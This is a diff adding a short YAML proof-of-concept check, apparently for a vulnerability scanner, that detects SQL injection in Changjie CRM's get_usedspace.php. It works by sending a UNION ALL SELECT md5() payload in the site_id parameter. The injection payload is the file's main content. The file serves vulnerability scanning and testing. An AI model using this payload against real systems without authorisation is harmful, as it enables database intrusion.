@@ -1,0 +1,20 @@
+name: poc-yaml-changjie-crm-sqli
+manual: true
+transport: http
+set:
+    a1: randomInt(200, 900)
+rules:
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /webservice/get_usedspace.php?site_id=-1159%20UNION%20ALL%20SELECT%20md5({{a1}})--
+        expression: response.body.bcontains(bytes(md5(string(a1))))
+expression: r1()
+detail:
+    author: xiaobaicai
+    links:
+        - http://wiki.peiqi.tech/wiki/webapp/%E7%95%85%E6%8D%B7CRM/%E7%95%85%E6%8D%B7CRM%20get_usedspace.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+    vulnerability:
+        id: CT-446234
+        level: high
